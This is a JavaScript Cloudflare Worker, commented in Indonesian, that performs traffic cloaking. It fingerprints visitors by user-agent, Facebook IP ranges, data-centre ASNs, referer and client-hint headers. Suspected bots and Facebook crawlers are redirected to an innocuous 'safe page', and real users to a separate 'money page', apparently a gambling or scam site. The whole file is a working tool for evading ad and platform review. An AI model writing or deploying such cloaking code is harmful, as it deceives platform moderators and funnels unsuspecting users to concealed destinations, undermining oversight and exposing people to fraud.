export default {
  async fetch(request) {
    let userAgent = request.headers.get("User-Agent") || "";
    let ip = request.headers.get("CF-Connecting-IP") || "";
    let referer = request.headers.get("Referer") || "";
    let acceptLanguage = request.headers.get("Accept-Language") || "";
    let acceptEncoding = request.headers.get("Accept-Encoding") || "";
    let secChUa = request.headers.get("Sec-Ch-Ua") || "";
    let secChUaMobile = request.headers.get("Sec-Ch-Ua-Mobile") || "";
    let secFetchSite = request.headers.get("Sec-Fetch-Site") || "";

    // Daftar bot dan crawler
    const botPatterns = [
      /facebookexternalhit/i, /Facebot/i, /bot/i, /crawl/i, /spider/i, /slurp/i,
      /bing/i, /ahrefs/i, /semrush/i, /mj12bot/i, /yandex/i, /duckduckgo/i, 
      /baidu/i, /sogou/i, /exabot/i, /ia_archiver/i, /headless/i, /chrome-lighthouse/i
    ];

    // Daftar IP Facebook resmi yang harus diblokir
    const facebookIPs = ["31.13.", "66.220.", "69.171.", "74.119.", "102.132.", "173.252.", "157.240."];

    // Daftar IP yang sering dipakai bot & scraper
    const blockedIPs = ["66.", "74.", "173.", "157.", "207.", "40.", "192.", "198."];

    // Safe page buat bot
    let safePage = "https://fifaindonesia.co/";
    // Money page buat user asli
    let moneyPage = "https://www.mawarperi.site/";

    // Cek apakah bot berdasarkan user-agent dan IP
    const isBot = botPatterns.some(pattern => pattern.test(userAgent)) ||
                  blockedIPs.some(prefix => ip.startsWith(prefix)) ||
                  facebookIPs.some(prefix => ip.startsWith(prefix)) ||
                  referer.includes("facebook.com") ||
                  (!acceptLanguage || !acceptEncoding); // Bot biasanya gak punya header ini

    // **Fingerprinting tambahan**
    let isSuspicious = false;

    // Deteksi pengguna headless browser atau emulator
    if (!secChUa && !secChUaMobile) {
      isSuspicious = true; // Browser modern seharusnya punya header ini
    }
    if (secFetchSite === "none") {
      isSuspicious = true; // Biasanya akses langsung oleh bot
    }
    if (userAgent.includes("Chrome") && !secChUa) {
      isSuspicious = true; // Chrome asli seharusnya punya `Sec-Ch-Ua`
    }
    
    // **Cek apakah IP berasal dari pusat data (Cloudflare ASN API)**
    const cfCountry = request.headers.get("CF-IPCountry") || "UNKNOWN";
    const cfAsn = parseInt(request.headers.get("CF-ASN") || "0");
    
    // ASN dari pusat data yang sering dipakai scraper
    const dataCenterASN = [15169, 16509, 8075, 14618, 20940, 32934, 19527]; // Google, AWS, Microsoft, Facebook, dll.

    if (dataCenterASN.includes(cfAsn)) {
      isSuspicious = true;
    }

    // Jika bot atau akses mencurigakan, redirect ke safe page
    if (isBot || isSuspicious) {
      return Response.redirect(safePage, 302);
    } 

    // Jika user asli, langsung redirect ke money page tanpa delay
    return Response.redirect(moneyPage, 302);
  }
};
